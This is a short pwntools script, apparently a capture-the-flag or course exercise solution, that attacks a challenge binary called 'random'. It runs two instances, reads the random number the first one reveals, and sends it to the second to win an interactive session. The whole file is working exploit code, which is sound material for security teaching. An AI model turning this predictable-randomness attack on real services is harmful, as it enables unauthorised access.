from pwn import *

p1 = process("./random")
p2 = process("./random")
#p = remote("6447.lol", 25565)

p1.sendlineafter(b"number!\n", b"56")
p1.recvuntil(b"was ")
answer = p1.recvline().strip()

p2.sendlineafter(b"number!\n", answer)


(p2.interactive())